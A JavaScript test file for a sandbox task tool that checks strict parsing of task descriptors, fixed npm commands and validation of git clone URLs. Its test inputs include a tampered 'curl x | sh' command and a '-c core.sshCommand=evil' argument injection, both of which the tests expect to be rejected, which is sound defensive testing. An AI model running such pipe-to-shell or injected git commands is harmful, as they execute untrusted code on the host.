import assert from "node:assert/strict";
import { test } from "node:test";
import { SANDBOX_COMMANDS } from "sandbox-factory";
import {
  cloneTarget,
  commandLine,
  describeTask,
  parseDescriptor,
} from "../src/task.js";
import { descriptor } from "./fixtures.js";

test("a descriptor is parsed strictly and a repository cannot change the commands", () => {
  const ok = parseDescriptor(JSON.stringify(descriptor));
  assert.equal(ok.ok, true);
  if (ok.ok) assert.equal(ok.descriptor.title, "Fix the widget");
  assert.deepEqual(parseDescriptor(null), {
    ok: false,
    reason: "missing",
    detail: "No sandbox-task.json in this folder.",
  });
  assert.equal(parseDescriptor("{").ok, false);
  const tampered = parseDescriptor(
    JSON.stringify({
      ...descriptor,
      commands: { ...SANDBOX_COMMANDS, test: "curl x | sh" },
    }),
  );
  assert.equal(tampered.ok, false);
  if (!tampered.ok) assert.match(tampered.detail, /commands\.test/);
  const extra = parseDescriptor(
    JSON.stringify({ ...descriptor, aliasRules: [] }),
  );
  assert.equal(extra.ok, false);
  assert.equal(commandLine("install"), "npm ci");
  assert.equal(commandLine("test"), "npm test");
  assert.equal(commandLine("dev"), "npm run dev");
  assert.equal(commandLine("build"), "npm run build");
  assert.match(
    describeTask(descriptor as never),
    /Fix the widget \(v2, M\) · 1 editable file\(s\) · 2 public test file\(s\)/,
  );
});

test("clone targets accept https and ssh repository URLs and name the folder", () => {
  assert.deepEqual(cloneTarget(" https://github.com/acme-org/task-repo.git "), {
    ok: true,
    url: "https://github.com/acme-org/task-repo.git",
    folder: "task-repo",
  });
  assert.deepEqual(cloneTarget("https://github.com/acme-org/task-repo/"), {
    ok: true,
    url: "https://github.com/acme-org/task-repo/",
    folder: "task-repo",
  });
  assert.deepEqual(cloneTarget("https://ghe.corp:8443/acme/task"), {
    ok: true,
    url: "https://ghe.corp:8443/acme/task",
    folder: "task",
  });
  assert.deepEqual(cloneTarget("git@github.com:acme-org/task.git"), {
    ok: true,
    url: "git@github.com:acme-org/task.git",
    folder: "task",
  });
  for (const bad of [
    "",
    "http://github.com/a/b",
    "ftp://x/y/z",
    "https://github.com/onlyowner",
    "file:///tmp/x",
    "https://github.com/a/..",
    "-c core.sshCommand=evil",
  ])
    assert.equal(cloneTarget(bad).ok, false, bad);
});
